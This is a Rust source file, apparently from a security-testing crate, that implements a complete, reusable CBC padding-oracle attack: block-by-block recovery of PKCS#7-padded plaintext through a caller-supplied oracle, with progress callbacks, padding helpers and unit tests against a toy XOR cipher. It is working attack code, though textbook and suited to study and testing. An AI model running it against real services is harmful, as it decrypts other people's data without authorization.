//! `padding_oracle_attack` — Full CBC padding oracle decryption attack.
//!
//! Implements a complete PKCS#7 padding-oracle attack against CBC-mode
//! ciphertexts.  Given a callable oracle that returns `true` for valid padding,
//! `PaddingOracleAttack` recovers the underlying plaintext block by block using
//! the standard two-phase XOR technique.
//!
//! This is distinct from `padding_oracle.rs` (which detects and classifies
//! oracles); here the focus is the *exploitation* algorithm with full block
//! ordering, IV handling, and optional parallelism hints.

use std::fmt;

// ── OracleResult ──────────────────────────────────────────────────────────────

/// Result returned after a single oracle call during the attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OracleResult {
    /// Oracle accepted the ciphertext (valid PKCS#7 padding).
    Valid,
    /// Oracle rejected the ciphertext (invalid padding).
    Invalid,
}

impl OracleResult {
    /// Returns `true` if the oracle accepted.
    #[must_use]
    pub fn is_valid(self) -> bool {
        self == Self::Valid
    }
}

impl From<bool> for OracleResult {
    fn from(b: bool) -> Self {
        if b { Self::Valid } else { Self::Invalid }
    }
}

impl fmt::Display for OracleResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Valid => write!(f, "VALID"),
            Self::Invalid => write!(f, "INVALID"),
        }
    }
}

// ── AttackError ───────────────────────────────────────────────────────────────

/// Errors that can occur during the padding-oracle attack.
#[derive(Debug, Clone)]
pub enum AttackError {
    /// The ciphertext length is not a multiple of the block size.
    InvalidCiphertextLength { len: usize, block_size: usize },
    /// The ciphertext is too short (needs at least 2 blocks: IV + 1 data block).
    CiphertextTooShort,
    /// No valid candidate was found for a specific byte position.
    NoValidCandidate { block: usize, byte: usize },
    /// PKCS#7 unpadding failed on the recovered plaintext.
    UnpaddingError(String),
}

impl fmt::Display for AttackError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::InvalidCiphertextLength { len, block_size } => {
                write!(f, "ciphertext length {len} is not a multiple of block size {block_size}")
            }
            Self::CiphertextTooShort => write!(f, "ciphertext too short (need ≥ 2 blocks)"),
            Self::NoValidCandidate { block, byte } => {
                write!(f, "no valid candidate at block {block}, byte {byte}")
            }
            Self::UnpaddingError(msg) => write!(f, "PKCS#7 unpadding error: {msg}"),
        }
    }
}

// ── AttackProgress ────────────────────────────────────────────────────────────

/// Snapshot of attack progress, suitable for logging or progress reporting.
#[derive(Debug, Clone)]
pub struct AttackProgress {
    /// Index of the block currently being decrypted (0 = first data block).
    pub current_block: usize,
    /// Total data blocks to decrypt.
    pub total_blocks: usize,
    /// Byte within the current block being recovered (0-based from the end).
    pub current_byte: usize,
    /// Total oracle queries issued so far.
    pub queries_issued: u64,
    /// Bytes recovered so far.
    pub bytes_recovered: usize,
}

impl fmt::Display for AttackProgress {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "block {}/{} byte {} | queries={} recovered={}",
            self.current_block + 1,
            self.total_blocks,
            self.current_byte,
            self.queries_issued,
            self.bytes_recovered,
        )
    }
}

// ── PaddingOracleAttack ───────────────────────────────────────────────────────

/// Executes a full CBC padding-oracle decryption attack.
///
/// # How it works
///
/// For each ciphertext block `C[i]`, the attack manipulates the preceding
/// block `C[i-1]` (or the IV for the first block) byte by byte.  By iterating
/// all 256 candidates for each byte position and observing the oracle verdict,
/// the intermediate decryption value `D[i]` can be recovered.  XOR-ing `D[i]`
/// with the original `C[i-1]` yields the plaintext `P[i]`.
type ProgressCb = Box<dyn Fn(&AttackProgress)>;

pub struct PaddingOracleAttack<F>
where
    F: FnMut(&[u8]) -> OracleResult,
{
    /// Block size of the cipher (e.g. 16 for AES-128-CBC).
    pub block_size: usize,
    /// The oracle function: receives a modified ciphertext, returns Valid/Invalid.
    oracle: F,
    /// Total oracle queries issued during the attack.
    pub queries_issued: u64,
    /// Optional progress callback invoked after each byte is recovered.
    pub on_progress: Option<ProgressCb>,
}

impl<F> PaddingOracleAttack<F>
where
    F: FnMut(&[u8]) -> OracleResult,
{
    /// Create a new attack with the given block size and oracle.
    #[must_use]
    pub fn new(block_size: usize, oracle: F) -> Self {
        Self {
            block_size,
            oracle,
            queries_issued: 0,
            on_progress: None,
        }
    }

    /// Set a progress callback.
    #[must_use]
    pub fn with_progress<P: Fn(&AttackProgress) + 'static>(mut self, cb: P) -> Self {
        self.on_progress = Some(Box::new(cb));
        self
    }

    // ── Core attack ───────────────────────────────────────────────────────────

    /// Decrypt a single data block `ct_block` using the preceding block
    /// `prev_block` (which may be the IV for the first data block).
    ///
    /// Returns the raw 16-byte plaintext block (still padded).
    fn decrypt_block(
        &mut self,
        prev_block: &[u8],
        ct_block: &[u8],
        block_index: usize,
        total_blocks: usize,
        bytes_recovered_before: usize,
    ) -> Result<Vec<u8>, AttackError> {
        let bs = self.block_size;
        // `intermediate` holds the recovered `D[i]` values.
        let mut intermediate = vec![0u8; bs];
        // `modified_prev` is the manipulated predecessor block we send to the oracle.
        let mut modified_prev = prev_block.to_vec();

        for pad_byte_index in 0..bs {
            // The PKCS#7 padding byte value we want the oracle to see.
            let pad_val = u8::try_from(pad_byte_index + 1).unwrap_or(u8::MAX);
            // Byte within the block (0-based from left).
            let byte_pos = bs - 1 - pad_byte_index;

            // Fix previously recovered bytes to produce the correct padding.
            for j in (byte_pos + 1)..bs {
                modified_prev[j] = intermediate[j] ^ pad_val;
            }

            let mut found = false;
            for candidate in 0u8..=255 {
                modified_prev[byte_pos] = candidate;
                let mut payload = modified_prev.clone();
                payload.extend_from_slice(ct_block);
                self.queries_issued += 1;

                if (self.oracle)(&payload).is_valid() {
                    // Verify: if we're on the last byte, confirm this is not
                    // a false positive caused by a different valid padding.
                    if pad_byte_index == 0 {
                        // Flip the second-to-last byte; if still valid, the
                        // pad length is 2+, so our finding might be wrong.
                        if byte_pos > 0 {
                            modified_prev[byte_pos - 1] ^= 0x01;
                            let mut check = modified_prev.clone();
                            check.extend_from_slice(ct_block);
                            self.queries_issued += 1;
                            let still_valid = (self.oracle)(&check).is_valid();
                            modified_prev[byte_pos - 1] ^= 0x01; // restore
                            if !still_valid {
                                continue;
                            }
                        }
                    }

                    // `candidate XOR pad_val` = `D[i][byte_pos]`.
                    intermediate[byte_pos] = candidate ^ pad_val;
                    found = true;

                    if let Some(ref cb) = self.on_progress {
                        cb(&AttackProgress {
                            current_block: block_index,
                            total_blocks,
                            current_byte: byte_pos,
                            queries_issued: self.queries_issued,
                            bytes_recovered: bytes_recovered_before + pad_byte_index + 1,
                        });
                    }
                    break;
                }
            }

            if !found {
                return Err(AttackError::NoValidCandidate {
                    block: block_index,
                    byte: byte_pos,
                });
            }
        }

        // Plaintext = D XOR original prev_block.
        let plaintext: Vec<u8> = intermediate
            .iter()
            .zip(prev_block.iter())
            .map(|(&d, &p)| d ^ p)
            .collect();

        Ok(plaintext)
    }

    /// Decrypt a full CBC ciphertext.
    ///
    /// `ciphertext` must begin with the IV followed by one or more ciphertext
    /// blocks (each of length `block_size`).  The IV is treated as a block but
    /// is never decrypted itself.
    ///
    /// Returns the decrypted plaintext with PKCS#7 padding removed.
    /// Decrypt a full CBC ciphertext.
    ///
    /// # Errors
    /// Returns `AttackError::InvalidCiphertextLength` if ciphertext length is not a multiple of `block_size`,
    /// `AttackError::CiphertextTooShort` if fewer than 2 blocks, or other errors on failure.
    pub fn decrypt_ciphertext(&mut self, ciphertext: &[u8]) -> Result<Vec<u8>, AttackError> {
        let bs = self.block_size;

        if !ciphertext.len().is_multiple_of(bs) {
            return Err(AttackError::InvalidCiphertextLength {
                len: ciphertext.len(),
                block_size: bs,
            });
        }

        let num_blocks = ciphertext.len() / bs;
        if num_blocks < 2 {
            return Err(AttackError::CiphertextTooShort);
        }

        let data_blocks = num_blocks - 1; // exclude the IV block
        let mut plaintext_padded: Vec<u8> = Vec::with_capacity(data_blocks * bs);
        let mut bytes_recovered = 0;

        for block_i in 0..data_blocks {
            let prev = &ciphertext[block_i * bs..(block_i + 1) * bs];
            let curr = &ciphertext[(block_i + 1) * bs..(block_i + 2) * bs];
            let pt_block = self.decrypt_block(prev, curr, block_i, data_blocks, bytes_recovered)?;
            bytes_recovered += bs;
            plaintext_padded.extend_from_slice(&pt_block);
        }

        // Remove PKCS#7 padding.
        pkcs7_unpad(&plaintext_padded, bs)
    }
}

// ── PKCS#7 helpers ────────────────────────────────────────────────────────────

/// Remove PKCS#7 padding from `data`.
fn pkcs7_unpad(data: &[u8], block_size: usize) -> Result<Vec<u8>, AttackError> {
    if data.is_empty() {
        return Err(AttackError::UnpaddingError("empty data".into()));
    }
    let pad_len = usize::from(*data.last().unwrap());
    if pad_len == 0 || pad_len > block_size || pad_len > data.len() {
        return Err(AttackError::UnpaddingError(format!(
            "invalid pad byte 0x{:02x}",
            data.last().unwrap()
        )));
    }
    for &b in &data[data.len() - pad_len..] {
        if usize::from(b) != pad_len {
            return Err(AttackError::UnpaddingError(format!(
                "inconsistent pad byte: expected 0x{pad_len:02x}, got 0x{b:02x}"
            )));
        }
    }
    Ok(data[..data.len() - pad_len].to_vec())
}

/// Apply PKCS#7 padding to `data` so that its length is a multiple of
/// `block_size`.
///
/// # Panics
/// Panics if `block_size` is 0 or greater than 255.
#[must_use]
pub fn pkcs7_pad(data: &[u8], block_size: usize) -> Vec<u8> {
    // Both twins in this crate — `padding_oracle::add_pkcs7` and
    // `padding_oracle_detector::pkcs7_pad` — guard the block size here, and this
    // copy was the one that did not: `% 0` divides by zero, and above 255 the pad
    // length no longer fits the pad byte, so the padding it writes cannot be
    // stripped back by any of the unpad functions.
    assert!(block_size > 0 && block_size <= 255, "block_size must be 1..=255");
    let pad_len = block_size - (data.len() % block_size);
    let mut padded = data.to_vec();
    padded.extend(std::iter::repeat_n(u8::try_from(pad_len).unwrap_or(u8::MAX), pad_len));
    padded
}

// ── decrypt_with_oracle (free function) ──────────────────────────────────────

/// Convenience function: decrypt `ciphertext` (IV-prepended CBC) using the
/// provided `oracle` and `block_size`.
///
/// # Errors
/// Returns `AttackError` if decryption or unpadding fails.
pub fn decrypt_with_oracle<F>(
    ciphertext: &[u8],
    block_size: usize,
    oracle: F,
) -> Result<Vec<u8>, AttackError>
where
    F: FnMut(&[u8]) -> OracleResult,
{
    PaddingOracleAttack::new(block_size, oracle).decrypt_ciphertext(ciphertext)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Toy cipher for testing ────────────────────────────────────────────────
    //
    // "Encryption": XOR each plaintext byte with its block index (not secure,
    // purely for testing the attack framework).

    const BS: usize = 4; // toy block size

    /// Toy CBC-like encrypt using XOR with block-counter as "key stream".
    fn toy_encrypt(plaintext: &[u8]) -> Vec<u8> {
        let padded = pkcs7_pad(plaintext, BS);
        let iv = vec![0u8; BS];
        let mut ciphertext = iv.clone();
        let mut prev = iv;
        for chunk in padded.chunks(BS) {
            let mut block = Vec::with_capacity(BS);
            for (i, &b) in chunk.iter().enumerate() {
                // "encrypt" = XOR with prev block XOR byte-position key
                block.push(b ^ prev[i] ^ (u8::try_from(i).unwrap_or(u8::MAX).wrapping_add(1)));
            }
            ciphertext.extend_from_slice(&block);
            prev = block;
        }
        ciphertext
    }

    /// Toy CBC-like decrypt — used by the oracle to check padding validity.
    fn toy_decrypt_raw(ciphertext: &[u8]) -> Vec<u8> {
        let mut plaintext = Vec::new();
        for i in 0..ciphertext.len() / BS - 1 {
            let prev = &ciphertext[i * BS..(i + 1) * BS];
            let curr = &ciphertext[(i + 1) * BS..(i + 2) * BS];
            for (j, &c) in curr.iter().enumerate() {
                plaintext.push(c ^ prev[j] ^ (u8::try_from(j).unwrap_or(u8::MAX).wrapping_add(1)));
            }
        }
        plaintext
    }

    /// Padding oracle: decrypt and check PKCS#7 validity.
    fn toy_oracle(ciphertext: &[u8]) -> OracleResult {
        if ciphertext.len() < BS * 2 || !ciphertext.len().is_multiple_of(BS) {
            return OracleResult::Invalid;
        }
        let plaintext = toy_decrypt_raw(ciphertext);
        // Check PKCS#7.
        let pad_byte = usize::from(*plaintext.last().unwrap_or(&0));
        if pad_byte == 0 || pad_byte > BS || pad_byte > plaintext.len() {
            return OracleResult::Invalid;
        }
        let tail = &plaintext[plaintext.len() - pad_byte..];
        if tail.iter().all(|&b| usize::from(b) == pad_byte) {
            OracleResult::Valid
        } else {
            OracleResult::Invalid
        }
    }

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let plaintext = b"hi!";
        let ct = toy_encrypt(plaintext);
        let decrypted = toy_decrypt_raw(&ct);
        // Last byte should be PKCS#7 pad.
        assert_eq!(&decrypted[..3], plaintext);
    }

    #[test]
    fn test_oracle_valid_padding() {
        let ct = toy_encrypt(b"test");
        assert_eq!(toy_oracle(&ct), OracleResult::Valid);
    }

    #[test]
    fn test_pkcs7_pad_unpad() {
        let data = b"hello";
        let padded = pkcs7_pad(data, 8);
        assert_eq!(padded.len(), 8);
        let unpadded = pkcs7_unpad(&padded, 8).unwrap();
        assert_eq!(unpadded, data);
    }

    #[test]
    fn test_pkcs7_unpad_invalid() {
        let bad = vec![0x00u8, 0x00, 0x00, 0x05]; // pad byte 0x05 but length 4
        assert!(pkcs7_unpad(&bad, 4).is_err());
    }

    #[test]
    fn test_oracle_result_from_bool() {
        assert_eq!(OracleResult::from(true), OracleResult::Valid);
        assert_eq!(OracleResult::from(false), OracleResult::Invalid);
    }

    #[test]
    fn test_oracle_result_is_valid() {
        assert!(OracleResult::Valid.is_valid());
        assert!(!OracleResult::Invalid.is_valid());
    }

    #[test]
    fn test_attack_invalid_length() {
        let result = decrypt_with_oracle(b"short", BS, toy_oracle);
        assert!(matches!(result, Err(AttackError::InvalidCiphertextLength { .. })));
    }

    #[test]
    fn test_attack_too_short() {
        let result = decrypt_with_oracle(&[0u8; BS], BS, toy_oracle);
        assert!(matches!(result, Err(AttackError::CiphertextTooShort)));
    }

    #[test]
    fn test_full_attack_single_block() {
        // Encrypt a 1-block plaintext and recover it.
        let plaintext = b"AB";
        let ct = toy_encrypt(plaintext);
        let mut attack = PaddingOracleAttack::new(BS, toy_oracle);
        let recovered = attack.decrypt_ciphertext(&ct).unwrap();
        assert_eq!(recovered, plaintext);
    }

    #[test]
    fn test_decrypt_with_oracle_free_fn() {
        let plaintext = b"XY";
        let ct = toy_encrypt(plaintext);
        let recovered = decrypt_with_oracle(&ct, BS, toy_oracle).unwrap();
        assert_eq!(recovered, plaintext);
    }

    #[test]
    fn test_queries_issued_nonzero() {
        let ct = toy_encrypt(b"Z");
        let mut attack = PaddingOracleAttack::new(BS, toy_oracle);
        let _ = attack.decrypt_ciphertext(&ct);
        assert!(attack.queries_issued > 0);
    }

    #[test]
    fn test_pkcs7_pad_rejects_out_of_range_block_size() {
        // The two twins in this crate assert the same bounds; this copy did not,
        // so `% 0` divided by zero and >255 produced unstrippable padding.
        assert!(std::panic::catch_unwind(|| pkcs7_pad(b"abc", 0)).is_err());
        assert!(std::panic::catch_unwind(|| pkcs7_pad(b"abc", 256)).is_err());
        // The legal extremes still work, and padding round-trips through unpad.
        assert_eq!(pkcs7_pad(b"abc", 1).len(), 4);
        let padded = pkcs7_pad(b"abc", 255);
        assert_eq!(padded.len(), 255);
        assert_eq!(pkcs7_unpad(&padded, 255).unwrap(), b"abc");
    }
}
